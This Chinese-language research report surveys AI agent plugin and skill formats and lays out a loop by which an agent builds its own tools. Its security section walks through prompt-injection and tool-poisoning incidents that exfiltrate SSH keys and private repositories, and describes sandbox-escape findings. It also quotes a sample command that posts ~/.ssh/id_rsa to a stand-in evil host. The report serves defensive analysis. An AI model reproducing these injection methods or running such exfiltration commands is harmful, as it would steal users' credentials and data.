# AI Agent 平台的插件/技能生态，与「让 Agent 自己给自己造工具」的可行做法

> 深度网络调研报告 · 全文中文
> 调研方法：只采信本次实际抓取成功（HTTP 200）的页面。**未能核验的一律显式标注**，并严格区分「文献结论」与「工程推断」。
> 抓取失败记录：`developers.openai.com/apps-sdk/*` 返回 **HTTP 403**，正文未能读取；GitHub Docs 的若干页面正文被 CDN 截断，仅能确认 URL 存在。

---

## 0. 结论速览（先看这四段）

1. **MCP 不是打包格式，是运行时线协议。** MCP 规范里没有 manifest、没有版本语义、没有依赖声明、没有权限声明字段；它规定的是 `tools/list` / `tools/call` / `notifications/tools/list_changed` 这条热更新链路。分发被拆到独立且仍在 preview 的 MCP Registry（`server.json`，反向 DNS 命名空间），且该 Registry 明确「把安全扫描委托给下游」。
2. **Agent Skills 是「文件夹 + Markdown + YAML」，Agent Plugins 是它的打包层。** 2025-12-18 Anthropic 把 Agent Skills 捐成开放标准（agentskills.io）；随后出现的 **Agent Plugins v1.0.0**（TSC 含 Amazon / Cursor / Microsoft / OpenAI / Vercel）把 `skills/` + `mcp.json` + `plugin.json` 定成可移植包。但该标准**明确把分发、安装、权限、UX 留给各客户端**——所以「格式统一」不等于「安全模型统一」。
3. **各家 manifest 的取舍方向完全不同**：Claude Code 的 `plugin.json` 最重（组件内联、`userConfig` 声明式配置、`dependencies`、`lspServers`、`monitors`、`bin/` 进 PATH），代价是**绑定生态**；Agent Plugins 最轻（只有 skills + MCP，闭合 schema），代价是**没有权限模型、没有依赖解析、没有注册表**；Cursor 走「已有 Git 仓库 + 人工审核 + 团队三档分发」；Copilot 走「Markdown 人格文件 + tools 白名单」。
4. **「Agent 给自己造工具」的最小闭环在工程上已被验证可行**——Claude Code 今天就提供了完整原语（`claude plugin init` 脚手架 → `~/.claude/skills/<name>/` 自动加载 → `claude plugin validate` 结构校验 → `claude plugin eval` 行为回归 → `/reload-plugins` 热加载 → `claude plugin disable <name>@skills-dir` 回滚），学术界则有 Voyager / LATM / CREATOR 三篇可引的闭环证据。**已知失败模式集中在四类：描述不匹配导致永不触发、上下文预算被工具定义吃光、自改代码逃逸沙箱、自建物被投毒后反向劫持宿主。**

---

## 1. 来源清单（标题 + URL + 一句话结论）

### 1.1 MCP 规范与生态

| # | 标题 | URL | 一句话结论 |
|---|---|---|---|
| S1 | MCP Specification — Key Changes (2025-11-25) | https://modelcontextprotocol.io/specification/2025-11-25/changelog | 最新修订版为 2025-11-25，新增 OIDC Discovery、增量 scope 同意、URL 模式 elicitation、sampling 内工具调用、OAuth Client ID Metadata Documents，并加入 **experimental tasks**（可轮询的持久请求）。 |
| S2 | MCP Specification (2025-06-18) | https://modelcontextprotocol.io/specification/2025-06-18 | 协议全貌：JSON-RPC 2.0、Hosts/Clients/Servers 三角、Server 提供 resources/prompts/tools、Client 提供 sampling/roots/elicitation；安全章明确「**MCP 自身无法在协议层强制这些安全原则**」。 |
| S3 | MCP Specification — Tools (2025-11-25) | https://modelcontextprotocol.io/specification/2025-11-25/server/tools.md | 工具定义字段为 `name/title/description/icons/inputSchema/outputSchema/annotations/execution`；`notifications/tools/list_changed` 是**官方热加载信号**；并规定「客户端**必须**把 tool annotations 视为不可信，除非来自受信服务器」。 |
| S4 | MCP Specification — Security Best Practices | https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices.md | 逐条枚举攻击面：confused deputy、token passthrough、SSRF（含 `169.254.169.254` 云元数据）、会话劫持、本地 MCP server 被投毒、OAuth URL 校验（`javascript:`/shell 注入）、stdio 代理提权、scope 最小化。 |
| S5 | The MCP Registry | https://modelcontextprotocol.io/registry/about.md | Registry 仍在 **preview**，只托管 `server.json` 元数据（名称/包位置/执行指令/能力），命名空间靠反向 DNS + GitHub/DNS 验证；**安全扫描委托给 npm/PyPI/Docker Hub 与下游聚合器**，且官方代码库「不是为自托管设计的」。 |
| S6 | mcp_dart `ToolAnnotations` API 文档 | https://pub.dev/documentation/mcp_dart/0.7.0/mcp_dart/ToolAnnotations-class.html | 给出四个 hint 字段的准确名称与默认值：`title`、`readOnlyHint`(false)、`destructiveHint`(**true**)、`idempotentHint`(false)、`openWorldHint`(**true**)，并原文警告「所有属性都是 hint……客户端**永远不应**基于来自不可信服务器的 ToolAnnotations 做工具调用决策」。 |

### 1.2 技能与插件标准

| # | 标题 | URL | 一句话结论 |
|---|---|---|---|
| S7 | Agent Skills Overview | https://agentskills.io/home | Agent Skills 由 Anthropic 原创、以开放标准发布，被多家 agent 产品采纳；核心是「一个含 `SKILL.md` 的文件夹」。 |
| S8 | Agent Skills Specification | https://agentskills.io/specification | frontmatter 字段与硬约束：`name`(必填，≤64 字符，仅小写字母/数字/连字符，首尾不得为连字符)、`description`(必填，≤1024 字符)、`license`、`compatibility`(≤500)、`metadata`、`allowed-tools`(空格分隔，实验性)；目录约定 `scripts/` `references/` `assets/`；三级 progressive disclosure = Discovery → Activation → Execution。 |
| S9 | Equipping agents for the real world with Agent Skills（Anthropic Engineering） | https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills | 官方设计说明：启动时只把全部技能的 `name`+`description` 预载进 system prompt，正文按需读取，因此**可打包的上下文量实际上无上限**；并给出「让 Claude 把自己成功的做法和常见错误写回技能」的官方迭代法；同时**明确警告恶意技能可植入漏洞或指使 Claude 外泄数据**。 |
| S10 | Anthropic「Agent Skills 成为开放标准」公告（文中 Update 行） | 同上 S9 页面内 `Update: We've published Agent Skills as an open standard` → https://agentskills.io/ | 2025-12-18 起 Agent Skills 成为跨平台开放标准。 |
| S11 | Agent Plugins — Overview | https://agent-plugins.org/ | 厂商中立的**可移植插件包格式** v1.0.0，把 Agent Skills 与 MCP server 打包；TSC 包含 Amazon、Cursor、Microsoft、OpenAI、Vercel 的核心维护者。 |
| S12 | Agent Plugins Specification v1.0.0 | https://agent-plugins.org/specification | 固定布局 `plugin.json` + `skills/` + `mcp.json` + 反向域名扩展目录；manifest 是**闭合 schema**（未知顶层字段报告并忽略，其他违规=致命拒绝）；v1 **只有两种组件类型**（skills、MCP servers）；路径必须 `./` 开头且不得逃出插件根；并**显式声明「分发、安装、权限、用户体验、客户端专属能力仍由各客户端自行掌控」**。 |
| S13 | Claude Code — Plugin manifest reference | https://code.claude.com/docs/en/plugins/manifest-reference | 全字段清单（`name/displayName/version/description/author/homepage/repository/license/keywords/defaultEnabled/dependencies/settings/userConfig/skills/commands/agents/hooks/mcpServers/lspServers/outputStyles/workflows/experimental`）与 `userConfig` 严格子 schema；`bin/` 会被加进 Bash 工具的 PATH；插件根 `CLAUDE.md` **不会**被加载。 |
| S14 | Claude Code — Create a plugin | https://code.claude.com/docs/en/plugins/create.md | 给出可执行的「造插件」路径：`claude plugin init <name>` 会在 `~/.claude/skills/<name>/` 生成 `.claude-plugin/plugin.json` + 根 `SKILL.md`，**下次会话自动加载为 `<name>@skills-dir`**；`--plugin-dir` 可单会话直载；`plugin-dev` 官方插件提供 `/plugin-dev:create-plugin`；`claude plugin eval` 通过「开/关插件跑同一组用例并给分差」验证插件是否真的改变行为。 |
| S15 | Claude Code — Plugin loading reference | https://code.claude.com/docs/en/plugins/loading.md | 三段式生命周期「declared（`enabledPlugins`）→ fetched（`~/.claude/plugins/`，含 `installed_plugins.json` / `known_marketplaces.json` / `cache/` / `synced/` / `flagged-plugins.json`）→ loaded（会话启动或 `/reload-plugins`）」；插件 id 四类来源 `@<marketplace>` / `@inline` / `@skills-dir` / `@synced`；版本解析顺序 = manifest `version` → marketplace entry `version` → 源类型（git 提交 SHA 前 12 位 / archive sha256 前 12 位 / 本地非 git 目录与 npm 均为 `unknown`）。 |
| S16 | Claude Code — Plugin security and trust | https://code.claude.com/docs/en/plugins/security.md | 核心事实陈述：「**你安装的 Claude Code 插件可以以你的用户权限在你的机器上执行任意代码**」；并且「Claude Code 的权限规则与沙箱只覆盖 Claude 发起的工具调用，**不覆盖插件自己运行的代码**」；hooks / MCP servers / LSP / mods 都在沙箱之外运行。 |
| S17 | Claude Code — Plugin dependencies | https://code.claude.com/docs/en/plugins/dependencies | 依赖条目形式 `"name"` / `"name@marketplace"` / `{name, marketplace, version}`；裸名在本插件所属 marketplace 内解析。 |
| S18 | Cursor — Plugins | https://cursor.com/docs/plugins | Cursor 同时支持 **Agent Plugins 开放标准**（根 `plugin.json`）与自有 **Cursor Plugins**（`.cursor-plugin/plugin.json`，额外含 rules/agents/commands/hooks/variables）；官方 marketplace 的插件以 Git 仓库分发、**每个都经人工审核**；团队 marketplace 提供 **Default Off / Default On / Required 三档分发模式**；注意 Cursor **不展开** `${PLUGIN_ROOT}`，须用 `${CURSOR_PLUGIN_ROOT}`。 |
| S19 | Cursor — Rules | https://cursor.com/docs/rules | 项目规则必须是 `.cursor/rules/*.mdc`（纯 `.md` **被忽略**，因为没有 frontmatter）；三字段 `description` / `globs` / `alwaysApply` 组合出四种应用模式：Always Apply、Apply Intelligently、Apply to Specific Files、Apply Manually。 |

### 1.3 平台模式 / 预设 / 子代理

| # | 标题 | URL | 一句话结论 |
|---|---|---|---|
| S20 | Claude Code — Choose a permission mode | https://code.claude.com/docs/en/permission-modes.md | 六种模式的精确语义与启动优先级（见 §4）；并给出「protected paths」「critical paths」两级硬护栏——**任何模式（含 `bypassPermissions`）都不会自动批准**对 `.git`、`.claude`、`.npmrc` 等受保护路径的写入，以及 `rm -rf /`、`rm -rf ~` 这类关键路径删除。 |
| S21 | Claude Code — Settings files and precedence | https://code.claude.com/docs/en/settings.md | 五级优先级：Managed > 命令行 `--settings` > `.claude/settings.local.json` > `.claude/settings.json` > `~/.claude/settings.json`；**列表型键（如 `permissions.allow`）跨文件合并而非覆盖**；少数安全键「更严格的值从任意层级胜出」。 |
| S22 | Claude Code — Create custom subagents | https://code.claude.com/docs/en/sub-agents.md | 子代理 = 带 YAML frontmatter 的 Markdown（`~/.claude/agents/`、`.claude/agents/`、插件 `agents/`）；**插件子代理出于安全**不支持 `hooks`/`mcpServers`/`permissionMode` 三个字段；子代理输出回到主会话前会过一道扫描（见 §6）。 |
| S23 | Zed — Agent Profiles | https://zed.dev/docs/ai/agent-profiles.md | 三个内置 profile：**`Write` / `Ask` / `Minimal`**；配置在 `agent.profiles`，字段为 `name`、`tools`（逐工具布尔：`read_file`/`grep`/`terminal`/`edit_file`）、`enable_all_context_servers`、`context_servers`、`default_model`；文档明确区分「profile 决定工具**是否可用**」与「Tool Permissions 决定是否放行」。 |
| S24 | Kilo Code — Custom Modes | https://kilo.ai/docs/customize/custom-modes | 最细致的自定义 Agent 配置面：`.md` + frontmatter（`description`/`mode`/`color`/`permission`/`model`/`steps`/`temperature`/`top_p`/`hidden`/`disable`），`mode` 取 `primary`/`subagent`/`all`；`permission` 是**有序、支持 glob、末条匹配胜出**的 `allow`/`deny`/`ask` 规则；优先级 内置 → 全局配置 → 项目配置 → `.kilo/` 目录 → 环境变量；组织托管 agent 覆盖同名内置且成员不可移除。 |
| S25 | Microsoft Learn — Create custom GitHub Copilot agents | https://learn.microsoft.com/en-us/training/modules/configure-customize-github-copilot-visual-studio-code/4-create-custom-github-copilot-agents | Copilot 自定义 agent 是 `.github/agents/*.agent.md`（或用户 profile），frontmatter 字段为 `description`/`name`/`tools`/`model`/`agents`/`handoffs`/`argument-hint`/`user-invokable`/`disable-model-invocation`/`target`/`mcp-servers`；**该特性原名就是 "custom chat modes"（VS Code 1.106 起）**，且兼容 Claude Code 的 agent 文件格式。 |
| S26 | GitHub Docs — Custom agents configuration（仅确认 URL 存在） | https://docs.github.com/en/copilot/reference/custom-agents-configuration | 官方参考页存在；**本次抓取正文被截断，字段细节未从该页核验**，字段结论引自 S25。 |

### 1.4 自扩展 / 自我改进 Agent（文献）

| # | 标题 | URL | 一句话结论 |
|---|---|---|---|
| S27 | Voyager: An Open-Ended Embodied Agent with LLMs (arXiv 2305.16291) | https://arxiv.org/abs/2305.16291 | 三件套 = 自动课程 + **可执行代码技能库（ever-growing skill library，负责存储与检索复杂行为）** + 结合环境反馈/执行错误/自验证的迭代提示；比前 SOTA 多 3.3× 唯一物品、行进 2.3× 距离、解锁科技树里程碑快至 15.3×；**技能库可迁移到全新 Minecraft 世界做零样本任务**。 |
| S28 | Gödel Agent (arXiv 2410.04444, ACL 2025 main) | https://arxiv.org/abs/2410.04444 | 受 Gödel machine 启发的自演化框架：LLM **在运行时动态修改自身逻辑与行为**，仅由高层目标经 prompting 引导，不依赖预定义流程或固定优化算法；在数学推理与复杂 agent 任务上「在性能、效率、泛化性上超过手工设计的 agent」。 |
| S29 | Self-Rewarding Language Models (arXiv 2401.10020, ICML 2024) | https://arxiv.org/abs/2401.10020 | 用 LLM-as-a-Judge 让模型在 Iterative DPO 中给自己发奖励；Llama 2 70B 迭代 3 轮后在 AlpacaEval 2.0 上超过 Claude 2、Gemini Pro、GPT-4 0613，且**「给自己打分的能力」与指令跟随能力同时提升**。 |
| S30 | Self-Taught Optimizer (STOP) (arXiv 2310.02304, COLM 2024) | https://arxiv.org/abs/2310.02304 | 一个 seed「改进器」程序改进自身；模型自发提出 beam search、遗传算法、模拟退火等策略；**摘要明确写道「我们评估了生成代码绕过沙箱的频率」**——即沙箱逃逸在本工作中是被实测的已知现象。 |
| S31 | Large Language Models as Tool Makers (LATM, arXiv 2305.17126) | https://arxiv.org/abs/2305.17126 | 两阶段闭环：强模型当 **tool maker** 造工具、弱模型当 **tool user** 用工具；工具被**缓存为 API** 供后续请求复用，形成「functional cache」（缓存一类请求的功能而非自然语言回答）；GPT-4 造 + GPT-3.5 用 ≈ 全 GPT-4 效果而成本大降。 |
| S32 | CREATOR (arXiv 2305.14318, EMNLP 2023 Findings) | https://arxiv.org/abs/2305.14318 | LLM 通过**「文档 + 代码实现」两步**自造工具，把「抽象的工具创造」与「具体的决策执行」解耦；在 MATH 与 TabMWP 上超过 CoT / PoT / 工具使用基线；并发布 Creation Challenge 数据集（2K 题）。 |
| S33 | Simon Willison — Claude Skills are awesome, maybe a bigger deal than MCP | https://simonwillison.net/2025/Oct/16/claude-skills/ | 关键工程观察：技能机制**完全依赖模型拥有文件系统 + 可执行命令**；MCP 最大的现实问题是 token 消耗（GitHub 官方 MCP 单独就吃掉数万 token）；技能每项只占几十 token。同时作者强调「**safe** 这个词承担了极重的分量」。 |

### 1.5 安全边界与真实事故

| # | 标题 | URL | 一句话结论 |
|---|---|---|---|
| S34 | ThaiCERT — Researchers Discover First Malicious MCP Server in Rogue Postmark-MCP Package | https://www.thaicert.or.th/en/2025/10/01/researchers-discover-first-malicious-mcp-server-in-rogue-postmark-mcp-package-used-to-steal-user-emails/ | 首个野外恶意 MCP server：npm 包 `postmark-mcp`，2025-09-15 由 `phanpak` 上传，恶意代码在 **v1.0.16（2025-09-17）** 引入，**一行代码把每封邮件 BCC 到 `phan@giftshop[.]club`**，下架前已被下载 **1,643+ 次**；由 Koi Security 披露。 |
| S35 | Invariant Labs — MCP Security Notification: Tool Poisoning Attacks | https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks | 工具描述里藏对人类不可见、对模型可见的指令：一个看似无害的 `add(a,b,sidenote)` 工具让 Cursor 读取并外传 `~/.cursor/mcp.json` 与 `~/.ssh/id_rsa`；**确认弹窗只显示简化工具名、隐藏真实参数**；并给出 **rug pull**（批准后偷改描述）与 **tool shadowing**（用自己工具的描述改写对另一个受信服务器 `send_email` 的行为，全量改发攻击者）两种升级手法——**shadowing 单独就足够，且不会出现在用户可见日志里**。 |
| S36 | Invariant Labs — GitHub MCP Exploited: Accessing private repositories via MCP | https://invariantlabs.ai/blog/mcp-github-vulnerability | 在公开仓库里放一个恶意 Issue 即可经间接提示注入劫持 agent，令其把私有仓库内容**自动开成公开仓库上的 PR** 完成外泄；用 Claude 4 Opus 实测成功；作者强调「**这不是 GitHub MCP server 代码的缺陷，而是架构层面的问题**」，且「模型对齐不足以保证安全」，建议最小权限 + 运行时数据流策略（如「每会话只允许访问一个 repo」）+ 持续监控。 |
| S37 | Pillar Security — Rules File Backdoor | https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents | 把恶意指令用不可见 Unicode（零宽连接符、双向文本标记、Unicode Tags 块）藏进 `.cursor/rules` 与 Copilot 指令文件；模型静默往产物里插 `<script src=攻击者站点>` 且**被指示不要告知开发者**；这些字符在 GitHub PR 审核界面同样不可见，且**污染会随 fork 传播**。披露过程：Cursor 2025-02-26 收到报告，2025-03-06 判定「属用户责任」并维持；GitHub 2025-03-12 同样判定用户责任，但**于 2025-05-01 上线了隐藏 Unicode 警告**。 |
| S38 | The Hacker News — Cursor AI Code Editor Fixed Flaw Allowing Attackers to Run Commands via Prompt Injection（CVE-2025-54135 / CurXecute） | https://thehackernews.com/2025/08/cursor-ai-code-editor-fixed-flaw.html | CVSS 8.6，Cursor 1.3（2025-07-29）修复；根因是 **`~/.cursor/mcp.json` 新增条目会自动启动、无需确认**，于是一条 Slack 消息里的注入就能改写该文件并 RCE——「**即使这次编辑被拒绝，代码执行也已经发生了**」；Cursor 随后废弃自动运行的 denylist 改为 allowlist；同文还记录 HiddenLayer 用被投毒的 `README.md` 劫持 Cursor（grep 找密钥 → curl 外传；`read_file` + `create_diagram` 工具组合外传 SSH 私钥），以及 Tracebit 针对 Gemini CLI 的同类攻击（经 `GEMINI.md`，0.1.14 修复）。 |
| S39 | Claude Code — Configure the sandboxed Bash tool | https://code.claude.com/docs/en/sandboxing.md | 沙箱只包 shell 命令（**Claude 的文件工具、MCP server、hooks、LSP、monitors 全在沙箱外**）；macOS 用 Seatbelt、Linux/WSL2 用 bubblewrap+socat，**原生 Windows 不沙箱**；并自陈局限：代理**默认不做 TLS 解包**，宽松域名可被 domain fronting 绕过、放通 `docker.sock` 等于放通宿主、`enableWeakerNestedSandbox`「大幅削弱安全性」。 |
| S40 | MCP Specification — Security Best Practices（本地 MCP server 段） | 同 S4 | 规范给出真实的恶意启动命令形态：`npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`，并要求客户端在「一键配置」前必须**不截断地展示将执行的完整命令**、把 MCP server 放进沙箱、默认最小权限。 |

---

## 2. 插件格式对比表

> 说明：MCP 本身不是打包格式，故在表中标注为「运行时协议」。「权限模型」列只写**该格式自身规定**的内容；运行时由宿主另行施加的权限不记入本列。

| 格式 | 载体 | 发现机制 | 权限授予模型（格式自身） | 依赖声明 | 版本语义 | 优势 | 代价 / 牺牲了什么 |
|---|---|---|---|---|---|---|---|
| **MCP**（协议，非包格式）(S1–S5) | 无固定载体；本地为可执行进程（stdio），远程为 HTTP/SSE 端点 | 运行时 `tools/list` 拉取；列表变化靠 `notifications/tools/list_changed` | **无声明式权限字段**。规范只规定客户端「**应**有 human-in-the-loop 可拒绝调用」、调用前**必须**取得显式用户同意；工具注解（`readOnlyHint` 等）**必须视为不可信** | **无** | **无**（协议按日期版本 2025-06-18 / 2025-11-25；Registry 侧另有 `server.json`） | 传输与生命周期标准化程度最高；工具可热更新；生态与客户端实现最广 | 上下文成本高（GitHub 官方 MCP 单独数万 token，S33）；描述即攻击面（S35）；分发靠一个仍在 preview、且明确不负责安全扫描的 Registry（S5） |
| **Agent Skills** (S7–S10) | 一个目录：`SKILL.md` + 可选 `scripts/` `references/` `assets/` | 宿主在启动时扫描技能目录，只读 `name` + `description`；命中后读全文 | **只有弱声明**：`allowed-tools`（空格分隔的预批准工具，规范标记为 Experimental）。其余靠宿主 | **无** | **无**（无 version 字段） | 极简、纯文本可读可 diff、token 效率高（每技能几十 token）、跨模型可移植（不依赖宿主内建支持） | 完全依赖宿主提供文件系统 + 命令执行（S33）；无版本、无依赖、无签名；「恶意技能可植入漏洞或指使外泄」只能靠人工审计（S9） |
| **Agent Plugins v1.0.0** (S11, S12) | 目录：`plugin.json`（根） + `skills/` + `mcp.json` + `<反向域名>/` 扩展目录 | **固定位置**，manifest 不得改写位置、不得内联组件配置；缺失位置不算错误 | **格式内没有权限模型**。只有路径围栏（组件路径必须 `./` 开头且解析后不逃出插件根，违规按最窄失败边界处理）；`mcp.json` 的 headers 被明文规定为**不是可移植的密钥机制**，且 v1 **不定义任何 OAuth 配置或凭据引用字段** | **无** | 有 `version` 字段，**推荐但不强制** SemVer；客户端**不得**仅因不是合法 SemVer 而拒绝 | 唯一真正厂商中立的可移植层；失败隔离设计很干净（坏 `mcp.json` 只禁用 MCP，坏条目只跳过该条目）；闭合 schema，未知字段报告并忽略而非崩溃 | **主动放弃了权限、依赖解析、分发、注册表、UX**（标准原文），并声明这些「仍由各客户端掌控」；v1 只有 skills + MCP 两种组件类型 |
| **Claude Code `plugin.json`** (S13–S17) | `.claude-plugin/plugin.json`（**manifest 可选**，缺失时按标准布局加载） | 三段式：`enabledPlugins` 声明 → `~/.claude/plugins/` 落盘 → 会话加载 / `/reload-plugins`；另有四种来源 id `@marketplace` / `@inline` / `@skills-dir` / `@synced` | **声明式 + 运行时提示双轨**：`userConfig` 是严格子 schema 的表单（`type`/`title`/`description`/`required`/`default`/`options`/`multiple`/`sensitive`），`sensitive: true` 走平台安全凭据存储而非 settings.json；且 `${user_config.KEY}` **禁止**用于 shell 形式的 hook 命令、monitor 命令与 MCP `headersHelper`（防 shell 二次解析） | **有**：`dependencies` 支持 `"name"` / `"name@marketplace"` / `{name, marketplace, version}` | `version` 是不做 SemVer 校验的字符串；设置它=把用户钉在该版本直到你改字符串；不设则按源类型取 12 位 commit SHA / sha256 前缀，本地非 git 目录与 npm 源取 `unknown` | 组件面最全（skills/commands/agents/hooks/mcpServers/lspServers/outputStyles/workflows/themes/monitors/`bin/` 进 PATH）；有官方结构校验器与行为回归器；有企业级管控面 | 与 Claude Code 生态强绑定；**插件自跑的代码在沙箱之外、以用户全权限执行**（S16）；`bin/` 进 PATH 是极强的能力让渡；依赖安装限制严格（仅注册表包 + 精确版本 + 支持的锁文件 + `--ignore-scripts` + 60s 超时） |
| **Cursor Plugins** (S18) | `.cursor-plugin/plugin.json`（另支持 Agent Plugins 的根 `plugin.json`） | Customize 页 / Marketplace；团队 marketplace 由 admin 在 Dashboard 管 | **格式本身无权限声明**；权限落在 Rules 与团队**三档分发模式**：Default Off / Default On / **Required**（强制安装且不可卸载） | 未在已抓取页面中声明 | 未在已抓取页面中声明 | 与 Rules/Skills/Agents/Commands/Hooks/Variables 打通；官方 marketplace **逐个人工审核**；Git 仓库分发便于审计 | 标准兼容有坑：**不展开** `${PLUGIN_ROOT}`/`${PLUGIN_DATA}`，须改 `${CURSOR_PLUGIN_ROOT}`（可移植性打折） |
| **GitHub Copilot custom agents** (S25, S26) | `.github/agents/*.agent.md`（workspace）或用户 profile | VS Code 自动检测 `.agent.md`；org 级 agent 登录后自动出现 | **工具白名单即权限**：`tools` 数组（`read`/`edit`/`search`/`fetch`/`terminal`/`agent`），省略=全部工具；`user-invokable: false` 可造「只能被子代理调用」的 agent | **无**（用 `mcp-servers` 内联声明 MCP） | **无** | 与 GitHub 生态/组织策略天然结合；**兼容 Claude Code 的 agent 文件格式**；`handoffs` 提供显式的人机交接点 | 无版本、无依赖、无注册表；`tools` 里当前环境不存在的项会**静默忽略**（不报错，难以发现配置写错） |
| **Zed agent profiles** (S23) | `settings.json` 的 `agent.profiles` | 随 settings 加载；profile 选择器/命令面板切换 | profile 只管**工具可用性**；allow/deny/confirm 交给独立的 Tool Permissions | 无 | 无 | 把「工具集」与「权限判定」**在概念上拆开**，是本次调研中最干净的一处职责切分 | 无打包/分发概念，不可移植 |
| **Kilo Code custom agents**（Roo 系）(S24) | `.kilo/agent/*.md` / `.kilo/agents/*.md` / `kilo.jsonc` 的 `agent` 键 / 全局 `~/.config/kilo/agent/` | 目录扫描 + 配置合并；同名逐属性 merge | **最细的声明式权限**：`permission` 为按工具分组的 glob 规则集，动作 `allow`/`deny`/`ask`，**末条匹配胜出**；`mode: primary|subagent|all` 控制可见性 | 无 | 无 | 权限粒度可到「只允许改 `*.md`，其他一律 deny」；组织托管 agent 覆盖同名内置 | 配置面复杂、易踩末条匹配的坑；无版本/依赖 |

### 2.1 四家格式的「权限模型」横向检索结论

把上表「权限授予模型」一列抽出来看，主流做法可归为四类，且**没有一家把权限粒度做到「能力（capability）级声明」**：

1. **无声明，纯运行时询问**：MCP（规范只规定 MUST 取得用户同意）、Agent Plugins（格式内完全无权限概念）。
2. **工具白名单即权限**：GitHub Copilot（`tools` 数组）、Claude Code 子代理（`tools` / `disallowedTools`）。
3. **有序 glob 规则 + 三动作**：Kilo Code（`allow`/`deny`/`ask`，末条胜出）、Claude Code（`permissions.allow` / `ask` / `deny`，跨层合并）。
4. **表单式声明 + 敏感项隔离**：Claude Code 插件的 `userConfig`（`sensitive: true` → 安全凭据存储）。

**工程推断**：之所以没人做 capability 级声明，是因为插件的能力面本质上是「任意代码执行」（S16 原文），声明式能力的收益被这个事实抹平了；真正起作用的是**把插件进程关进沙箱**——而 S16/S39 表明，主流产品**恰恰没有**对插件自跑代码做沙箱（只有 Claude 发起的 shell 命令在沙箱内）。

---

## 3. 「Agent 自建插件」最小闭环：步骤拆解

> 标注规则：`[源]` = 有明确出处；`[推断]` = 工程推断，无直接出处。
> 术语约定：本文用「自建插件」指 Agent 自己写出一个可被宿主在**下一次加载**时发现的技能/工具包。

### 闭环总览

```
缺口检测 → 写制品(+元数据) → 结构校验 → 执行验证 → 落位注册 → 重载生效 → 再入隔离 → 失败回滚
```

### 步骤拆解

| # | 步骤 | 具体动作 | 依据 |
|---|---|---|---|
| 0 | **前置条件检查** | 宿主必须提供三样：(a) 持久文件系统，(b) 能执行命令的工具，(c) 一个「会话启动时扫描某目录」的加载器。三者缺一，自建插件无法闭环。 | `[源]` S33 原文指出技能机制「**完全依赖**模型能访问文件系统、有导航工具、能在该环境执行命令」；S15 说明加载器就是 `~/.claude/skills/`（`@skills-dir`）/`.claude/agents/`/`enabledPlugins` 这几条扫描路径。 |
| 1 | **缺口检测（何时该造）** | 不要凭空造。先跑代表性任务，观察 agent 在哪里卡住或缺上下文，再针对该缺口增量造。 | `[源]` S9 官方建议第一条：「Start with evaluation: Identify specific gaps in your agents' capabilities by running them on representative tasks and observing where they struggle」。 |
| 2 | **写制品** | 最少写两个东西：**元数据 + 正文**。技能形态：`<skill-dir>/SKILL.md`，frontmatter 必须含 `name`（≤64 字符、小写字母数字连字符、首尾非连字符）与 `description`（≤1024 字符）。需要确定性计算时，把代码作为 `scripts/` 一起打进目录。插件形态：`~/.claude/skills/<name>/.claude-plugin/plugin.json`（至少 `name`）。 | `[源]` S8（字段与硬约束）、S7（目录布局）、S13（`plugin.json` 必填项与路径规则）、S14（`claude plugin init` 生成的双文件结构）、S27（Voyager 的技能库存的是**可执行代码**）、S31（LATM 把工具缓存为 API）、S32（CREATOR 要求「文档 + 代码实现」两步）。 |
| 3 | **把 description 当检索键来写** | 这是全流程最容易被低估的一步：`name`+`description` 是唯一进入 system prompt 的部分，模型**只凭它决定是否触发**。所以要写「做什么 + 什么时候用」，而不是写实现细节。 | `[源]` S9 原文：「Pay special attention to the `name` and `description` of your skill. Claude will use these when deciding whether to trigger the skill」；S24 亦说明 description「被编排器用于委派」。 |
| 4 | **结构校验（机器可判的部分先判）** | 跑宿主的结构校验器，把 schema 错误、路径逃逸、引用未声明的配置项挡在加载之前。Claude Code 侧就是 `claude plugin validate <dir>`，CI 里加 `--strict` 把 warning 也变成失败。若走 Agent Plugins 标准，闭合 schema 要求：未知顶层字段报告并忽略、**其他任何 schema 违规=致命、拒绝加载整个插件**；组件路径必须 `./` 开头且解析后留在插件根内。 | `[源]` S13（validate 的三种输出与 MCP 专项检查）、S14（`--strict`）、S12（§5.2 致命性规则与 §4.1 路径围栏）。 |
| 5 | **执行验证（语义层）** | 光格式对不算数，必须真的跑一次并检查结果。Voyager 的做法是把「环境反馈 + 执行错误 + 自验证」三者回灌进下一轮修改；CREATOR 的做法是强制走到「代码实现」这一步；工程上对应 Claude Code 的 `claude plugin eval`——**用同一组用例跑「开插件 / 关插件」两遍并给分差**，分差≈0 就说明这个自建件没起作用。 | `[源]` S27（自验证）、S32（代码实现）、S14（`claude plugin eval` 的机制描述）。 |
| 6 | **落位与注册** | 放进加载器扫描的目录即可，**不需要中心注册表**。三种可用路径：(a) `~/.claude/skills/<name>/`（带 `.claude-plugin/plugin.json`，**下次会话自动加载**为 `<name>@skills-dir`）；(b) `--plugin-dir` 单会话直载；(c) 写进 `enabledPlugins`。 | `[源]` S14、S15。 |
| 7 | **重载生效（并意识到热加载的边界）** | 运行中的会话**不会**自动看到磁盘变化：要跑 `/reload-plugins`。更关键的边界：**若 `~/.claude/agents/` 目录在会话开始时不存在，新写的 agent 文件不会被本会话发现，必须重启**；monitors 即使 reload 也需要重启会话；hook/MCP/LSP 在插件中途更新后仍指向旧版本路径直到 reload。 | `[源]` S15（三段式加载与 `/reload-plugins`）、S22（watcher 只覆盖会话启动时已存在的目录；三类情况仍需重启）。 |
| 8 | **再入隔离（把自建物当不可信输入）** | 下一次使用它时，它是「外部内容」。三道可用护栏：(a) 技能/插件正文里的指令只应影响**已有工具**的用法，不应能自行提权；(b) Claude Code **拒绝插件子代理设置 `hooks`/`mcpServers`/`permissionMode`**——自建件不能给自己扩权；(c) 子代理返回主会话的报告会过一遍扫描，把模仿宿主标签的文本转义、并在报告提及 `bypassPermissions` 之类权限设置时插入 `[harness: subagent output matched instruction-shaped pattern(s): …]` 标记行。 | `[源]` S22（三个字段被拒 + 输出扫描的两种改法与「该扫描不判断内容是否恶意」）、S16（技能/commands/agents「作为指令进入上下文，影响 Claude 如何使用它已有的工具」）、S3（annotations 必须视为不可信）。 |
